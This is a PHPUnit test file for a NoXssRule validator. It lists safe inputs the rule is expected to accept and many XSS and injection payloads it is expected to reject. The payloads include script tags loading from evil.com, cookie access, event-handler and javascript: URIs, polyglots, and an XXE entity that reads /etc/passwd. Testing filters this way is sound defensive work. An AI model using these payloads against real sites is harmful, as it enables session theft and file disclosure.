<?php

declare(strict_types=1);

namespace Tests\Unit\Rules;

use App\Rules\NoXssRule;
use Tests\TestCase;

class NoXssRuleTest extends TestCase
{
    private NoXssRule $rule;

    protected function setUp(): void
    {
        parent::setUp();
        $this->rule = new NoXssRule();
    }

    public function test_accepts_safe_text(): void
    {
        $safeInputs = [
            'Normal text content',
            'Email: user@example.com',
            'Price: $99.99',
            'Text with numbers 12345',
            'Text with punctuation!',
            'Line 1\nLine 2',
        ];

        foreach ($safeInputs as $input) {
            $this->assertTrue(
                $this->rule->passes('field', $input),
                "Failed to accept safe input: {$input}"
            );
        }
    }

    public function test_rejects_script_tags(): void
    {
        $scriptTags = [
            '<script>alert("XSS")</script>',
            '<SCRIPT>alert("XSS")</SCRIPT>',
            '<script src="http://evil.com/xss.js"></script>',
            '<script>document.cookie</script>',
            'Text before <script>alert(1)</script> text after',
        ];

        foreach ($scriptTags as $input) {
            $this->assertFalse(
                $this->rule->passes('field', $input),
                "Failed to reject script tag: {$input}"
            );
        }
    }

    public function test_rejects_inline_event_handlers(): void
    {
        $eventHandlers = [
            '<img src="x" onerror="alert(1)">',
            '<div onclick="alert(\'XSS\')">Click me</div>',
            '<body onload="alert(1)">',
            '<input type="text" onfocus="alert(1)">',
            '<a href="#" onmouseover="alert(1)">Link</a>',
            '<button onmousedown="alert(1)">Button</button>',
        ];

        foreach ($eventHandlers as $input) {
            $this->assertFalse(
                $this->rule->passes('field', $input),
                "Failed to reject event handler: {$input}"
            );
        }
    }

    public function test_rejects_javascript_protocol(): void
    {
        $javascriptProtocols = [
            '<a href="javascript:alert(1)">Click</a>',
            '<img src="javascript:alert(1)">',
            '<iframe src="javascript:alert(1)"></iframe>',
            'javascript:void(0)',
            'JAVASCRIPT:alert(1)',
        ];

        foreach ($javascriptProtocols as $input) {
            $this->assertFalse(
                $this->rule->passes('field', $input),
                "Failed to reject javascript protocol: {$input}"
            );
        }
    }

    public function test_rejects_data_protocol_with_script(): void
    {
        $dataProtocols = [
            '<img src="data:text/html,<script>alert(1)</script>">',
            'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
            '<a href="data:text/html,<script>alert(1)</script>">Link</a>',
        ];

        foreach ($dataProtocols as $input) {
            $this->assertFalse(
                $this->rule->passes('field', $input),
                "Failed to reject data protocol: {$input}"
            );
        }
    }

    public function test_rejects_iframe_tags(): void
    {
        $iframeTags = [
            '<iframe src="http://evil.com"></iframe>',
            '<IFRAME src="javascript:alert(1)"></IFRAME>',
            '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
        ];

        foreach ($iframeTags as $input) {
            $this->assertFalse($this->rule->passes('field', $input));
        }
    }

    public function test_rejects_object_embed_tags(): void
    {
        $objectTags = [
            '<object data="http://evil.com/exploit.swf"></object>',
            '<embed src="http://evil.com/xss.swf">',
            '<applet code="XSS.class"></applet>',
        ];

        foreach ($objectTags as $input) {
            $this->assertFalse($this->rule->passes('field', $input));
        }
    }

    public function test_rejects_style_tag_with_javascript(): void
    {
        $styleTags = [
            '<style>@import url("javascript:alert(1)");</style>',
            '<style>body{background:url("javascript:alert(1)")}</style>',
            '<link rel="stylesheet" href="javascript:alert(1)">',
        ];

        foreach ($styleTags as $input) {
            $this->assertFalse($this->rule->passes('field', $input));
        }
    }

    public function test_rejects_svg_with_script(): void
    {
        $svgAttacks = [
            '<svg onload="alert(1)">',
            '<svg><script>alert(1)</script></svg>',
            '<svg><animate onbegin="alert(1)">',
        ];

        foreach ($svgAttacks as $input) {
            $this->assertFalse($this->rule->passes('field', $input));
        }
    }

    public function test_rejects_meta_refresh_redirect(): void
    {
        $metaTags = [
            '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
            '<meta http-equiv="refresh" content="0;url=http://evil.com">',
        ];

        foreach ($metaTags as $input) {
            $this->assertFalse($this->rule->passes('field', $input));
        }
    }

    public function test_rejects_encoded_attacks(): void
    {
        $encodedAttacks = [
            '&#60;script&#62;alert(1)&#60;/script&#62;',
            '%3Cscript%3Ealert(1)%3C/script%3E',
            '\x3cscript\x3ealert(1)\x3c/script\x3e',
            '&lt;script&gt;alert(1)&lt;/script&gt;',
        ];

        foreach ($encodedAttacks as $input) {
            $this->assertFalse(
                $this->rule->passes('field', $input),
                "Failed to reject encoded attack: {$input}"
            );
        }
    }

    public function test_rejects_case_variation_attacks(): void
    {
        $caseVariations = [
            '<ScRiPt>alert(1)</sCrIpT>',
            '<IMG SRC="x" OnErRoR="alert(1)">',
            '<A HREF="JaVaScRiPt:alert(1)">',
        ];

        foreach ($caseVariations as $input) {
            $this->assertFalse($this->rule->passes('field', $input));
        }
    }

    public function test_rejects_obfuscated_attacks(): void
    {
        $obfuscatedAttacks = [
            '<scr<script>ipt>alert(1)</scr</script>ipt>',
            '<img src="x" onerror="a\x6cert(1)">',
            '<img src="x" onerror="eval(atob(\'YWxlcnQoMSk=\'))">',
        ];

        foreach ($obfuscatedAttacks as $input) {
            $this->assertFalse($this->rule->passes('field', $input));
        }
    }

    public function test_rejects_null_byte_attacks(): void
    {
        $nullByteAttacks = [
            "<img src=\"x\"\x00 onerror=\"alert(1)\">",
            "<script\x00>alert(1)</script>",
        ];

        foreach ($nullByteAttacks as $input) {
            $this->assertFalse($this->rule->passes('field', $input));
        }
    }

    public function test_rejects_dom_based_xss(): void
    {
        $domXss = [
            'document.write("<script>alert(1)</script>")',
            'eval("alert(1)")',
            'window.location="javascript:alert(1)"',
            'innerHTML="<img src=x onerror=alert(1)>"',
        ];

        foreach ($domXss as $input) {
            $this->assertFalse($this->rule->passes('field', $input));
        }
    }

    public function test_accepts_safe_html_entities(): void
    {
        $safeEntities = [
            'Copyright &copy; 2024',
            'Price: 5 &lt; 10',
            'AT&amp;T',
            '&nbsp;&nbsp;Indented text',
        ];

        foreach ($safeEntities as $input) {
            $this->assertTrue(
                $this->rule->passes('field', $input),
                "Failed to accept safe HTML entity: {$input}"
            );
        }
    }

    public function test_accepts_markdown_like_syntax(): void
    {
        $markdownInputs = [
            '**bold text**',
            '_italic text_',
            '# Heading',
            '- List item',
            '[Link text](https://example.com)',
        ];

        foreach ($markdownInputs as $input) {
            $this->assertTrue(
                $this->rule->passes('field', $input),
                "Should accept markdown syntax: {$input}"
            );
        }
    }

    public function test_rejects_form_tag_attacks(): void
    {
        $formAttacks = [
            '<form action="http://evil.com" method="post">',
            '<input type="hidden" name="csrf" value="hacked">',
            '<button formaction="javascript:alert(1)">Submit</button>',
        ];

        foreach ($formAttacks as $input) {
            $this->assertFalse($this->rule->passes('field', $input));
        }
    }

    public function test_rejects_base_tag_attacks(): void
    {
        $baseAttacks = [
            '<base href="http://evil.com/">',
            '<base target="_blank" href="javascript:alert(1)">',
        ];

        foreach ($baseAttacks as $input) {
            $this->assertFalse($this->rule->passes('field', $input));
        }
    }

    public function test_rejects_xml_attacks(): void
    {
        $xmlAttacks = [
            '<?xml version="1.0"?><root><script>alert(1)</script></root>',
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
        ];

        foreach ($xmlAttacks as $input) {
            $this->assertFalse($this->rule->passes('field', $input));
        }
    }

    public function test_returns_descriptive_error_message(): void
    {
        $this->rule->passes('field', '<script>alert(1)</script>');

        $message = $this->rule->message();

        $this->assertIsString($message);
        $this->assertStringContainsString('XSS', strtoupper($message));
    }

    public function test_handles_null_value(): void
    {
        $this->assertTrue($this->rule->passes('field', null));
    }

    public function test_handles_empty_string(): void
    {
        $this->assertTrue($this->rule->passes('field', ''));
    }

    public function test_handles_numeric_values(): void
    {
        $this->assertTrue($this->rule->passes('field', 12345));
        $this->assertTrue($this->rule->passes('field', 123.45));
    }

    public function test_handles_boolean_values(): void
    {
        $this->assertTrue($this->rule->passes('field', true));
        $this->assertTrue($this->rule->passes('field', false));
    }

    public function test_accepts_safe_urls(): void
    {
        $safeUrls = [
            'https://example.com',
            'http://example.com/path/to/page',
            'https://example.com?param=value&other=123',
            'mailto:user@example.com',
            'tel:+1234567890',
        ];

        foreach ($safeUrls as $url) {
            $this->assertTrue(
                $this->rule->passes('field', $url),
                "Should accept safe URL: {$url}"
            );
        }
    }

    public function test_accepts_code_snippets_in_proper_format(): void
    {
        // When properly formatted for display (not execution)
        $codeSnippets = [
            '```javascript\nconst x = 1;\n```',
            '`<script>alert(1)</script>`',
        ];

        foreach ($codeSnippets as $snippet) {
            $this->assertTrue(
                $this->rule->passes('field', $snippet),
                "Should accept properly formatted code: {$snippet}"
            );
        }
    }

    public function test_rejects_polyglot_attacks(): void
    {
        $polyglotAttacks = [
            'javascript:"/*\'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>',
            '">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)>',
        ];

        foreach ($polyglotAttacks as $attack) {
            $this->assertFalse($this->rule->passes('field', $attack));
        }
    }

    public function test_performance_with_large_input(): void
    {
        $largeInput = str_repeat('safe text ', 1000); // ~10KB

        $startTime = microtime(true);

        $this->rule->passes('field', $largeInput);

        $endTime = microtime(true);
        $duration = ($endTime - $startTime) * 1000;

        // Should validate large input in under 20ms
        $this->assertLessThan(20, $duration);
    }

    public function test_performance_with_many_validations(): void
    {
        $inputs = array_merge(
            array_fill(0, 50, 'safe input text'),
            array_fill(0, 50, '<script>alert(1)</script>')
        );

        $startTime = microtime(true);

        foreach ($inputs as $input) {
            $this->rule->passes('field', $input);
        }

        $endTime = microtime(true);
        $duration = ($endTime - $startTime) * 1000;

        // 100 validations should complete in under 50ms
        $this->assertLessThan(50, $duration);
    }
}
